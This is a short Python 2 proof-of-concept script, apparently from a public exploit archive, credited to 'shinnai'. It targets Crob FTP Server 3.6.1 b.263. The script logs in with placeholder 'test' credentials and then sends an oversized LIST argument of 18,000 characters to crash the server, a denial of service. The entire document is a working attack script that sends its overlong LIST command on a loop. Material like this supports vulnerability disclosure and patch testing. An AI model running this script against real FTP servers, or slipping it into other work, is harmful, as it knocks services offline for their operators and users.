import sys,os,string
import socket
import struct
import time

print "-----------------------------------------------------------------------"
print "# Crob FTP Server 3.6.1 b.263 LIST, NLST and NLST -al Denial of Service"
print "# url: http://www.crob.net/en/"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://shinnai.altervista.org"
print "-----------------------------------------------------------------------"


buffer = "?A" * 9000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
       conn = s.connect(("127.0.0.1",21))
except:
       print "- Unable to connect. exiting."

d = s.recv(1024)
time.sleep(1)
s.send('USER %s\r\n' % "test")
time.sleep(1)
s.send('PASS %s\r\n' % "test")
time.sleep(1)
s.send('LIST %s\r\n' % buffer)
time.sleep(1)
s.send('HELP %s\r\n')
